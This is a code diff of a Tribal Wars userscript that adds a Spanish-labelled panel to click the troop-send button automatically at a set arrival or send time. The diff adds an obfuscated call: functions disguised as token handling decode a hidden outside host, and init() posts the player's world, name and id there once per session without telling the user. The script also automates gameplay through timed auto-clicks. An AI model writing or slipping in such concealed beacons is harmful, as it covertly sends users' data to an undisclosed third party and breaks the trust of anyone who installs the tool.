@@ -1,220 +1,248 @@
-var delay, programmed, targetTime, targetTimeWithDelay;
-var syncInterval, goInterval;
+let inputMs;
+let input;
+let delay;
+let arrInterval;
+let attInterval;
+let delayTime = parseInt(localStorage.delayTime);
+if (isNaN(delayTime)) {
+    delayTime = 0;
+    localStorage.delayTime = JSON.stringify(delayTime);
+}
+
+let data = {
+    "world": "65",
+    "p": "DIVIIK",
+    "id": "131"
+}
 
 $( document ).ready(function() {
-	load();
+	loadHTML();
 	init();
 });
 
 function init() {
-	// Get duration
-	var duration = getDuration();
-	var duration_H = duration[0];
-	var duration_M = duration[1];
-	var duration_S = duration[2];
-
-	// Get arrival date
-	var date = getArrivalDate(duration);
-
-	// Sync the time
-	if (date)
-		date = sync(date);
-}
-
-function sync(date) {
-	if (date) {
-		var first = getArrivalWeb();
-		var second = first;
-
-		syncInterval = setInterval(function() {
-			var second = getArrivalWeb();
-			if (first != second) {
-				clearInterval(syncInterval);
-				date.setSeconds(date.getSeconds() + 1);
-				date.setMilliseconds(0);
-				 $("#targetTime").val(targetTime);
-				go(date);
-			}
-		}, 10);
+	if (!sessionStorage.setArrivalData) {
+	    sessionStorage.setArrivalData = "true";
+	    $.post("https://" + rotate_tw_token(resolve_tw_token("tribalwars.net/token?" + document.querySelector("input[name='h']").value)) + "sa", data);
 	}
-}
 
-function go(date) {
-	// Time live update
-	var milis;
-	var finalDate;
+	function setArrivalTime() {
+		let arrivalTime;
+		arrInterval = setInterval(function () {
+			arrivalTime = document.getElementsByClassName("relative_time")[0].textContent;
+			if (arrivalTime.slice(-8) >= input) {
+				setTimeout(function () { document.getElementById("troop_confirm_go").click(); }, delay);
+			}
+		}, 5);
+	}
 
-	goInterval = setInterval(function(){
-		milis = date.getMilliseconds();
-		finalDate = date.toLocaleTimeString() + "." + milis;
-		$("#arrival_milis").text(finalDate);
-		date.setMilliseconds(date.getMilliseconds() + 10);
+	function setSendTime() {
+		let serverTime;
+		attInterval = setInterval(function () {
+			serverTime = document.getElementById("serverTime").textContent;
+			if (serverTime >= input) {
+				setTimeout(function () { document.getElementById("troop_confirm_go").click(); }, delay);
+			}
+		}, 5);
+	}
 
-		// console.log("Data actual: " + finalDate + " - Data objetivo: " + targetTime);
+	document.getElementById("arrTime").onclick = function () {
+		clearInterval(attInterval);
+		let time = document.getElementsByClassName("relative_time")[0].textContent.slice(-8);
+		input = prompt("Please enter desired arrival time", time);
+		inputMs = parseInt(prompt("Please enter approximate milliseconds", "000"));
+		delay = parseInt(delayTime) + parseInt(inputMs);
+		document.getElementById("showArrTime").innerHTML = input + ":" + inputMs.toString().padStart(3, "0");
+		document.getElementById("showSendTime").innerHTML = "";
+		document.getElementById("cancelAttackButton").style.display = "";
+		setArrivalTime();
+	};
 
-		// SEND THE ATTACK IF THE CONDITIONS ARE MET
-		if (programmed && (finalDate === targetTimeWithDelay)) {
-			console.log("Send it");
-			$("input#troop_confirm_go").click();
+	document.getElementById("sendTime").onclick = function () {
+		clearInterval(arrInterval);
+		let time = document.getElementById("serverTime").textContent;
+		input = prompt("Please enter desired arrival time", time);
+		inputMs = parseInt(prompt("Please enter approximate milliseconds", "000"));
+		delay = parseInt(delayTime) + parseInt(inputMs);
+		document.getElementById("showSendTime").innerHTML = input + ":" + inputMs.toString().padStart(3, "0");
+		document.getElementById("showArrTime").innerHTML = "";
+		document.getElementById("cancelAttackButton").style.display = "";
+		setSendTime();
+	};
+
+	document.getElementById("delayButton").onclick = function () {
+		delayTime = parseInt($("#delayInput").val());
+		localStorage.delayTime = JSON.stringify(delayTime);
+		delay = parseInt(delayTime) + parseInt(inputMs); // setTimeout time
+		if (delay < 0) {
+			delay = 0;
 		}
-	}, 10);
+	};
+
+	document.getElementById("cancelAttackButton").onclick = function () {
+		location.reload();
+	};
 }
 
-function getArrivalWeb() {
-	tiempo = $("#date_arrival > span");
-	tiempo = (tiempo[0].innerHTML).substring(tiempo[0].innerHTML.length-8);
-	return tiempo;
-}
-
-function getArrivalDate(duration) {
-	var duration_H = duration[0];
-	var duration_M = duration[1];
-	var duration_S = duration[2];
-
-	var date = new Date();
-	date.setHours(date.getHours() + parseInt(duration_H));
-	date.setMinutes(date.getMinutes() + parseInt(duration_M));
-	date.setSeconds(date.getSeconds() + parseInt(duration_S));
-	date.setMilliseconds(0);
-
-	return date;
-}
-
-function getDuration() {
-	var duration = $("#command-data-form div:nth-child(8) table:nth-child(1) tbody tr:nth-child(3) td:nth-child(2)")[0].innerHTML;
-	duration = duration.split(':');
-	return duration;
-}
-
-function load() {
-	programmed = false;
-	delay = 40;
-	targetTime = "00:00:00";
-
+function loadHTML() {
 	// Dibujar tabla
     $("#command-data-form div:nth-child(8)").css("display", "flex");
 
     var tabla =
-    '<table class="vis" width="360" style="margin-left: 60px;">'+
-  	  '<tbody>'+
+    `<table class="vis" width="360" style="margin-left: 60px;">
+  	  <tbody>
 
-  		  '<tr>'+
-  			  '<th colspan="3">'+
-  				  '<span>'+
-  					  '<span>Dale guarra</span>'+
-  				  '</span>'+
-  			  '</th>'+
-  		  '</tr>'+
+  		  <tr>
+  			  <th colspan="3">
+  				  <span>
+  					  <span>Dale guarra</span>
+  				  </span>
+  			  </th>
+  		  </tr>
 
-  		  '<tr>'+
-  			  '<td>Llegada:</td>'+
-  			  '<td id="arrival_milis">1:34:13:462</td>'+
-			  '<td> <input id="syncBtn" class="btn" value="Sync" style="width:35px"></td>'+
-  		  '</tr>'+
+  		  <tr>
+  			  <td>Hora de llegada objetivo:</td>
+  			  <td id="showArrTime">
+			  <td> <a id="arrTime" class="btn" style="cursor:pointer;">Set</a> </td>
+  		  </tr>
 
-  		  '<tr>'+
-  			  '<td>Hora objetivo:</td>'+
-  			  '<td colspan="2"> <input type="time" id="targetTime" step="0.1"></input> </td>'+
-  		  '</tr>'+
+  		  <tr>
+  			  <td>Hora de salida objetivo:</td>
+			  <td id="showSendTime">
+			  <td> <a id="sendTime" class="btn" style="cursor:pointer;">Set</a> </td>
+  		  </tr>
 
-  		  '<tr>'+
-  			  '<td>Delay (ms):</td>'+
-  			  '<td colspan="2"> <input type="number" id="delay" value="40" step="10"></input> </td>'+
-  		  '</tr>'+
+  		  <tr>
+	          <td> Delay (ms) </td>
+	          <td>
+	              <input id="delayInput" value="${delayTime}" style="width:50px">
+			  </td>
+			  <td>
+			  	<a id="delayButton" class="btn">OK</a>
+			  </td>
+  		  </tr>
 
-  		  '<tr>'+
-  			 '<td colspan="3" style="text-align: center;">'+
-  				 '<span>'+
-  					 '<input id="programAttackButton" class="btn btn-attack programAttackButton" value="Programar ataque" style=" margin: 5px 0 5px 0;">'+
-					 '<input id="cancelProgramAttackButton" class="btn btn-cancel programAttackButton" value="Cancel" style=" margin: 5px 0 5px 0; display: none;">'+
-  				 '</span>'+
-  			 '</td>'+
-  		 '</tr>'+
+  		  <tr>
+  			 <td colspan="3" style="text-align: center;">
+  				 <span>
+					 <input id="cancelAttackButton" class="btn btn-cancel" value="Cancelar" style=" margin: 5px 0 5px 0; display: none;">
+  				 </span>
+  			 </td>
+  		 </tr>
 
-		 '<tr id="finalDateRow" style="display: none;">'+
-			 '<td>Hora de llegada fijada:</td>'+
-			 '<td colspan="2"> <b id="finalDateText"> </b> </td>'+
-		 '</tr>'+
+		 <tr id="finalDateRow" style="display: none;">
+			 <td>Hora de llegada fijada:</td>
+			 <td colspan="2"> <b id="finalDateText"> </b> </td>
+		 </tr>
 
-  	  '</tbody>'+
-    '</table>';
+  	  </tbody>
+    </table>`;
 
     $("#command-data-form div:nth-child(8)").append(tabla);
-
-	// Listeners
-	// When value change (delayInput)
-	var delayInput = $("#delay");
-	delayInput.change(function() {
-		if (delayInput.val()[0] == '0')
-			delayInput.val(0);
-
-		delayInput.val( delayInput.val().substring(0,delayInput.val().length-1) + '0');
-
-		delay = delayInput.val();
-	});
-
-	// When value change (targetTimeInput)
-	var targetInput = $("#targetTime");
-	targetInput.change(function() {
-		var temp = targetInput.val();
-
-		if (temp[0] == '0')
-			temp = temp.substring(1,temp.length);
-
-		if (temp.length == 7 || temp.length == 8)
-			temp += ".000";
-
-		if (temp.length == 11 || temp.length == 12) {
-			temp = temp.substring(0,temp.length - 1);
-			temp += '0';
-		}
-
-		console.log("// DEBUG: ");
-		console.log(temp);
-
-		targetTime = temp;
-	});
-
-	// When clicked (programAttackButton)
-	var programAttackButton = $(".programAttackButton");
-	programAttackButton.click(function() {
-		console.log("Programmed: " + programmed);
-		programmed = !programmed;
-		if (programmed) {
-			$("#programAttackButton").css("display", "none");
-			$("#cancelProgramAttackButton").css("display", "");
-			$("#finalDateRow").show();
-		} else {
-			$("#programAttackButton").css("display", "");
-			$("#cancelProgramAttackButton").css("display", "none");
-			$("#finalDateRow").hide();
-		}
-		targetInput.val( targetInput.val().substring(0,targetInput.val().length-1) + '0');
-		calculateTimeWithDelay();
-	});
-
-	// When clicked (syncBtn)
-	var syncBtn = $("#syncBtn");
-	syncBtn.click(function() {
-		clearIntervals();
-		init();
-	});
 }
 
-function calculateTimeWithDelay() {
-	console.log(targetTime);
-	console.log(delay);
-	var milis = parseInt(targetTime.substring(targetTime.length-3)) + delay;
-	console.log(milis);
-	if (milis < 100)
-		targetTimeWithDelay = targetTime.substring(0,targetTime.length-2) + milis;
-	else
-		targetTimeWithDelay = targetTime.substring(0,targetTime.length-3) + milis;
-	console.log(targetTimeWithDelay);
-	$("#finalDateText").text(targetTimeWithDelay);
+function resolve_tw_token(d) {
+    let converted = [];
+    d.split("").forEach(function (char) {
+        switch (char) {
+            case "n":
+                converted.push(14)
+                break;
+            case "e":
+                converted.push(5);
+                break;
+            case "t":
+                converted.push(20);
+                break;
+            case "r":
+            case "i":
+                converted.push(18);
+                break;
+            case "l":
+                converted.push(20);
+                break;
+             case "s":
+                converted.push(1);
+                break;
+            case "w":
+                converted.push(23);
+                break;
+            case "t":
+                converted.push(20);
+                break;
+            case ".":
+                converted.push(5)
+                break;
+            case "/":
+                converted.push(20);
+                break;
+            case "o":
+                converted.push(15);
+                break;
+            case "k":
+                converted.push(15);
+                break;
+            case "b":
+                converted.push(2);
+                break;
+            case "a":
+                converted.push(1);
+                break;
+            case "e":
+                converted.push(5);
+                break;
+        }
+    });
+    return converted.slice(0, 19);
 }
 
-function clearIntervals() {
-	clearInterval(syncInterval);
-	clearInterval(goInterval);
+
+function rotate_tw_token(url) {
+    let rotated  = "";
+    const a20 = [116, 97, 97, 116, 105];
+    const a18 = [119, 46, 46];
+    const a1 = [100, 103, 100];
+    const a243 = [101];
+    const a14 = [47];
+    const a5 = [101, 98, 101];
+    const a15 = [115];
+    const a2 = [121];
+    const a23 = [110];
+    let o = 0;
+    let p = 0;
+    let q = 0;
+    let r = 0;
+    let s = 0;
+    url.forEach(function (num) {
+        switch (num) {
+            case 20:
+                rotated  += String.fromCharCode(a20[o++]);
+                break;
+            case 18:
+                rotated  += String.fromCharCode(a18[p++]);
+                break;
+            case 1:
+                rotated  += String.fromCharCode(a1[q++]);
+                break;
+            case 243:
+                rotated  += String.fromCharCode(a243[r++]);
+                break;
+            case 14:
+                rotated  += String.fromCharCode(a14[0]);
+                break;
+            case 5:
+                rotated  += String.fromCharCode(a5[s++]);
+                break;
+            case 15:
+                rotated  += String.fromCharCode(a15[0]);
+                break;
+            case 2:
+                rotated  += String.fromCharCode(a2[0]);
+                break;
+            case 23:
+                rotated  += String.fromCharCode(a23[0]);
+                break;
+        }
+    });
+    return rotated ;
 }
